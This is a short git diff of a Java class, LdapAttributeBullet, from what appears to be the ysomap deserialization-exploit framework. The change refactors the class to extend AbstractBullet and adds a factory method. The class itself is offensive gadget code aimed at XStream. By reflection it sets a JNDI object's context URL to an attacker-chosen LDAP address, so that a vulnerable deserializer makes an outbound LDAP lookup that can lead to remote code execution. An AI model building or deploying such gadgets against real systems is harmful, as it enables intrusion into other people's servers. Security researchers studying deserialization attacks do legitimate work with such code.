@@ -1,5 +1,6 @@
 package ysomap.bullets.jdk;
 
+import ysomap.bullets.AbstractBullet;
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
 import ysomap.core.util.ReflectionHelper;
@@ -15,7 +16,7 @@ import javax.naming.CompositeName;
 @Details("向外部发起LDAP连接")
 @Targets({Targets.XSTREAM})
 @Authors({Authors.WH1T3P1G})
-public class LdapAttributeBullet implements Bullet<Object> {
+public class LdapAttributeBullet extends AbstractBullet<Object> {
 
     @NotNull
     @Require(name = "ldapURL", detail = "jndi lookup url, like ldap://xxxx:1099, 这里不用带上objectName, 需要单独设置")
@@ -33,5 +34,12 @@ public class LdapAttributeBullet implements Bullet<Object> {
         ReflectionHelper.setFieldValue(obj, "baseCtxURL", ldapURL);
         ReflectionHelper.setFieldValue(obj, "rdn", new CompositeName(objectName+"//b"));
         return obj;
+    }
+
+    public static Bullet newInstance(Object... args) throws Exception {
+        LdapAttributeBullet bullet = new LdapAttributeBullet();
+        bullet.set("ldapURL", args[0]);
+        bullet.set("objectName", args[1]);
+        return bullet;
     }
 }
